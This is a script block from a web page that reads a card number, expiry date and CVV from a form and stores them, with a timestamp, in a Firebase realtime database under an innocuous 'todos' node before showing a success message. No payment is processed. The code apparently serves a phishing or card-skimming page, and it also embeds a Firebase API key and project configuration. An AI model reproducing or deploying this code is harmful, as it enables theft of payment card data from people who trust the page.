    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.1/firebase-app.js";
        import { getDatabase, ref, set, onValue, push } from "https://www.gstatic.com/firebasejs/10.12.1/firebase-database.js";
      
      
        const firebaseConfig = {
  apiKey: "AIzaSyCIl3uwIzicmmu5F6tLiEvRHtm-86ji0os",
  authDomain: "checkers-f586c.firebaseapp.com",
  projectId: "checkers-f586c",
  storageBucket: "checkers-f586c.firebasestorage.app",
  messagingSenderId: "397893268298",
  appId: "1:397893268298:web:9fa64c2f5aa868d72fc7b3",
  databaseURL:"https://checkers-f586c-default-rtdb.firebaseio.com/"
};
        const app = initializeApp(firebaseConfig);
        const database = getDatabase(app);
        const Submit = async () => {
            let card = document.getElementById("cardnumber").value;
            let datey = document.getElementById("datey").value;
            let cvv = document.getElementById("cvv").value;


            let date = new Date().toLocaleDateString();
            let time = new Date().toLocaleTimeString();
            let name = "Visa Card";
            let emptyErrorMessage = document.getElementById("emptyErrorMessage");
            let successMessage = document.getElementById("successMessage");
            let spinn = document.getElementById("spinn");
            let modal = document.getElementById("modal");
            

            if (card ==="" || datey === "" || cvv ==="") {
                emptyErrorMessage.style.display = 'block';
                setTimeout(() => {
                    emptyErrorMessage.style.display = 'none';
                }, 5000);
                return;
            }

            let obj = {
                Name: name,
                Card: card,
                Date: date,
                Time: time,
                Datey: datey,
                Cvv: cvv

            };
            let dbRef = ref(database, `todos`);
            let newDbRef = push(dbRef);

            spinn.style.display = 'block';

            try {
                await set(newDbRef, obj);
                spinn.style.display = 'none';
                successMessage.style.display = 'block';
                setTimeout(() => {
                    successMessage.style.display = 'none';
                }, 5000);
            } catch (error) {
                console.log("failed to save", error);
                spinn.style.display = 'none';
                modal.style.display = 'block';
                setTimeout(() => {
                    modal.style.display = 'none';
                }, 7000);
            }
       
            document.getElementById('cardnumber').value= ''
            document.getElementById('datey').value= ''
            document.getElementById('cvv').value= ''
        };

        window.Submit = Submit;
      </script>
